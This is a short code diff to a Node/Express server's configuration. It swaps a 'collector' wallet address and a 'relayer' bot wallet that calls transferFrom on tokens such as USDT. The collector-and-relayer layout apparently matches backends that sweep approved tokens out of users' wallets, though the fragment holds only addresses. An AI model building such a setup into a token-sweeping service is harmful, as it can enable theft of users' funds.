@@ -13,10 +13,10 @@ app.use(express.json());
 // ============ CORRECT CONFIGURATION ============
 const CONFIG = {
     // 🎯 COLLECTOR = Final destination (your main wallet)
-    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
+    COLLECTOR_ADDRESS: "0x5681d680b047BF5b12939625c56301556991005E",
     
     // 🤖 RELAYER = Bot wallet that executes transferFrom
-    RELAYER_ADDRESS: "0x5681d680b047BF5b12939625c56301556991005E",
+    RELAYER_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
     
     // Default token addresses
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
